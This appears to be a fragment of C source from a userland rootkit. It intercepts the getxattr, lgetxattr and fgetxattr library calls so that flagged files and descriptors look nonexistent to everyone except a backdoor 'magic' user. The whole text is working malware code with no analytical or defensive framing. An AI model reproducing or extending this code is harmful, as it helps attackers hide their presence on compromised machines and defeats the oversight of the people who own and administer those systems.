ssize_t getxattr(const char *path, const char *name, void *value, size_t size){
    hook(CGETXATTR);
    if(magicusr()) return (ssize_t)call(CGETXATTR, path, name, value, size);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CGETXATTR, path, name, value, size);
}

ssize_t lgetxattr(const char *path, const char *name, void *value, size_t size){
    hook(CLGETXATTR);
    if(magicusr()) return (ssize_t)call(CLGETXATTR, path, name, value, size);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CLGETXATTR, path, name, value, size);
}

ssize_t fgetxattr(int fd, const char *name, void *value, size_t size){
    hook(CFGETXATTR);
    if(magicusr()) return (ssize_t)call(CFGETXATTR, fd, name, value, size);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (ssize_t)call(CFGETXATTR, fd, name, value, size);
}